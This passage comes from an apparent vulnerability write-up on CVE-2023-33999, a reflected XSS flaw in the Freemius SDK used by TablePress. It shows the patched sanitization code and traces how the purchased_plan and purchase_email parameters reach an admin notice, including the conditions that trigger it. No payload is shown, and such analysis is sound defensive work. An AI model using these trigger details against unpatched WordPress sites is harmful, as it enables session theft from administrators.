</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">fs_request_get_raw</span><span class="p">(</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$def</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$type</span> <span class="o">=</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_string</span><span class="p">(</span> <span class="nv">$type</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$type</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span> <span class="nv">$type</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">     * Note to WordPress.org reviewers:
</span></span></span><span class="line"><span class="cl"><span class="sd">     * This is a helper function to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function&#39;s usage.
</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span> <span class="nv">$type</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s1">&#39;post&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// phpcs:ignore WordPress.Security.NonceVerification.Missing
</span></span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="o">:</span> <span class="nv">$def</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s1">&#39;get&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// phpcs:ignore WordPress.Security.NonceVerification.Recommended
</span></span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="o">:</span> <span class="nv">$def</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// phpcs:ignore WordPress.Security.NonceVerification.Recommended
</span></span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="o">:</span> <span class="nv">$def</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Don&#39;t unslash if the value itself is empty (empty string, null, empty array etc).
</span></span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$value</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$value</span> <span class="o">:</span> <span class="nx">wp_unslash</span><span class="p">(</span> <span class="nv">$value</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">fs_sanitize_input</span><span class="p">(</span> <span class="nv">$input</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$input</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$input</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$input</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="o">=</span> <span class="nx">fs_sanitize_input</span><span class="p">(</span> <span class="nv">$value</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Allow empty values to pass through as-is, like `null`, `&#39;&#39;`, `0`, `&#39;0&#39;` etc.
</span></span></span><span class="line"><span class="cl">        <span class="nv">$input</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$input</span> <span class="o">:</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$input</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$input</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">fs_request_get</span><span class="p">(</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$def</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$type</span> <span class="o">=</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">fs_sanitize_input</span><span class="p">(</span> <span class="nx">fs_request_get_raw</span><span class="p">(</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$def</span><span class="p">,</span> <span class="nv">$type</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>The patch separates <strong>data retrieval</strong> and <strong>data sanitization</strong> into two distinct steps.
<code>fs_request_get_raw()</code> only retrieves the raw value from GET/POST/REQUEST and removes escaping with <code>wp_unslash()</code>, while <code>fs_sanitize_input()</code> is responsible for sanitizing (even when the input is an array) using <code>sanitize_text_field()</code>. Finally, <code>fs_request_get()</code> always returns sanitized data. As a result, malicious data is no longer returned directly, reducing the risk of <strong>Reflected XSS</strong> exploitation.</p>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>The <code>fs_request_get()</code> function is called in many places.</p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-12-05-cve-2023-33999/call.png" title="127 references" data-thumbnail="/posts/2025-12-05-cve-2023-33999/call.png" data-sub-html="<h2>Call</h2><p>127 references</p>"><img loading="lazy" src='/posts/2025-12-05-cve-2023-33999/call.png' alt="Call" height="165" width="702"></a><figcaption class="image-caption">127 references</figcaption>
  </figure></p>
<p>so the tracing process is somewhat time-consuming.</p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-12-05-cve-2023-33999/search.png" title="Locations where fs_request_get is called" data-thumbnail="/posts/2025-12-05-cve-2023-33999/search.png" data-sub-html="<h2>Search</h2><p>Locations where fs_request_get is called</p>"><img loading="lazy" src='/posts/2025-12-05-cve-2023-33999/search.png' alt="Search" height="663" width="1616"></a><figcaption class="image-caption">Locations where fs_request_get is called</figcaption>
  </figure></p>
<p>The <code>dynamic_init()</code> function calls <code>fs_request_get()</code> to retrieve the values of keys such as <code>purchased_plan</code> and <code>purchase_email</code> from the request, and then uses these values to display a license purchase confirmation message in the admin page. These values are not sanitized before being included in the displayed content, leading to the risk that user-controlled data can inject malicious code and cause a <strong>Reflected Cross-Site Scripting (XSS)</strong> vulnerability.</p>
<p>For this message to appear, 3 conditions must be met:</p>
<ol>
<li>The request must be called from the Admin Dashboard</li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">is_user_in_admin</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Check if a real user is visiting the admin dashboard.
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @author Vova Feldman (@svovaf)
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @since  1.1.7
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @return bool
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">is_user_in_admin</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">is_admin</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="o">!</span> <span class="nx">self</span><span class="o">::</span><span class="na">is_ajax</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="o">!</span> <span class="nx">self</span><span class="o">::</span><span class="na">is_cron</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="o">!</span> <span class="nx">self</span><span class="o">::</span><span class="na">is_admin_post</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><ol start="2">
<li>Check whether the user has already connected (opted-in) to Freemius.</li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">is_registered</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Check if user has connected his account (opted-in).
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Note:
</span></span></span><span class="line"><span class="cl"><span class="sd"> *      If the user opted-in and opted-out on a later stage,
</span></span></span><span class="line"><span class="cl"><span class="sd"> *      this will still return true. If you want to check if the
</span></span></span><span class="line"><span class="cl"><span class="sd"> *      user is currently opted-in, use:
</span></span></span><span class="line"><span class="cl"><span class="sd"> *          `$fs-&gt;is_registered() &amp;&amp; $fs-&gt;is_tracking_allowed()`
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @author Vova Feldman (@svovaf)
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @since  1.0.1
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param bool $ignore_anonymous_state Since 2.5.1
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @return bool
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">is_registered</span><span class="p">(</span> <span class="nv">$ignore_anonymous_state</span> <span class="o">=</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">is_object</span><span class="p">(</span> <span class="nx">value</span><span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_user</span> <span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">is_premium</span><span class="p">()</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$ignore_anonymous_state</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="o">!</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">is_anonymous</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>After successfully setting up the plugin, the system sends a confirmation email to complete this connection (opt-in) process.</p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-12-05-cve-2023-33999/opt_in.png" title="Connect to Freemius" data-thumbnail="/posts/2025-12-05-cve-2023-33999/opt_in.png" data-sub-html="<h2>Opt In</h2><p>Connect to Freemius</p>"><img loading="lazy" src='/posts/2025-12-05-cve-2023-33999/opt_in.png' alt="Opt In" height="238" width="1380"></a><figcaption class="image-caption">Connect to Freemius</figcaption>
  </figure></p>
<ol start="3">
<li>The request must contain the <code>purchase_completed</code> parameter</li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">fs_request_has</span><span class="p">(</span> <span class="s1">&#39;purchase_completed&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">fs_request_has</span><span class="p">(</span> <span class="nv">$key</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><hr>
<p><code>dynamic_init()</code> is called inside the <code>fs_dynamic_init()</code> function</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">fs_dynamic_init</span><span class="p">(</span> <span class="nv">$module</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$fs</span> <span class="o">=</span> <span class="nx">Freemius</span><span class="o">::</span><span class="na">instance</span><span class="p">(</span> <span class="nv">$module</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">],</span> <span class="nv">$module</span><span class="p">[</span><span class="s1">&#39;slug&#39;</span><span class="p">],</span> <span class="k">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$fs</span><span class="o">-&gt;</span><span class="na">dynamic_init</span><span class="p">(</span> <span class="nv">$module</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$fs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>This function creates an instance of <code>Freemius</code> and calls <code>dynamic_init()</code> to initialize the SDK with the configuration from <code>$module</code>.</p>
<p><code>fs_dynamic_init()</code> is called in the file <code>tablepress/tablepress.php</code> (the <code>tb_tp_fs()</code> function)</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" data-open="true" title="tablepress/tablepress.php"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">tablepress/tablepress.php</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">tb_tp_fs</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$tb_tp_fs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$tb_tp_fs</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Include Freemius SDK.
</span></span></span><span class="line"><span class="cl">        <span class="k">require_once</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/libraries/freemius/start.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$tb_tp_fs</span> <span class="o">=</span> <span class="nx">fs_dynamic_init</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;id&#39;</span>                <span class="o">=&gt;</span> <span class="s1">&#39;10340&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;slug&#39;</span>              <span class="o">=&gt;</span> <span class="s1">&#39;tablepress&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;type&#39;</span>              <span class="o">=&gt;</span> <span class="s1">&#39;plugin&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;public_key&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;pk_b215ca1bb4041cf43ed137ae7665b&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;is_premium&#39;</span>        <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;has_addons&#39;</span>        <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;has_paid_plans&#39;</span>    <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;menu&#39;</span>              <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;slug&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;tablepress&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;contact&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;support&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;account&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;pricing&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;opt_in_moderation&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;new&#39;</span>       <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;updates&#39;</span>   <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;localhost&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;is_live&#39;</span>           <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$tb_tp_fs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>This function:</p>
<ul>
<li>Loads the Freemius SDK</li>
<li>Calls <code>fs_dynamic_init()</code> with the configuration for TablePress</li>
<li>Stores the instance in the global variable <code>$tb_tp_fs</code></li>
</ul>
<p><code>tb_tp_fs()</code> is called directly in <code>tablepress/tablepress.php</code></p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" data-open="true" title="tablepress/tablepress.php"><div class="chroma">
